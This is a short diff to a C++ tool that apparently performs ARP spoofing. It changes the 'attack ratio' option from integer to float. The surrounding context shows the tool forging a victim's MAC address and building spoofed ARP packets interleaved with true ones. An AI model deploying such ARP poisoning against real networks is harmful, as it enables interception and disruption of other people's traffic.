@@ -21,13 +21,13 @@ int main(int argc, char* argv[])
     args.positional("ip", po::value<std::string>()->default_value(""), "ipv4 address", 1);
     args.optional("attack,a", po::bool_switch(), "deploy arp attack");
     args.optional("per,p", po::value<int>()->default_value(500), "send period (ms)");
-    args.optional("ratio,r", po::value<int>()->default_value(100), "attack ratio (%)");
+    args.optional("ratio,r", po::value<float>()->default_value(100), "attack ratio (%)");
     CHECK_ERR_RET_INT(args.parse());
 
     auto opt_ip = args.get<std::string>("ip");
     auto opt_attack = args.get<bool>("attack");
     auto opt_per = args.get<int>("per");
-    auto opt_ratio = args.get<int>("ratio");
+    auto opt_ratio = args.get<float>("ratio");
 
     if (opt_ip.empty() && !opt_attack) {
         ELOG("empty ipv4 address, please input ip");
@@ -57,7 +57,7 @@ int main(int argc, char* argv[])
         net::Mac victim_forged_mac = victim_actual_mac;
         victim_forged_mac.b6 += 1;
         ILOG("forging victim's mac to {}...", victim_forged_mac);
-        ILOG("send period is {}ms, attack ratio {}%", opt_per, opt_ratio);
+        ILOG("send period is {}ms, attack ratio {:.3f}%", opt_per, opt_ratio);
         int lie_per = opt_per * (opt_ratio / 100.0);
         int true_per = opt_per - lie_per;
         auto lie = net::Packet::arp(victim_forged_mac, victim_ip, apt.mac, apt.ip, true);
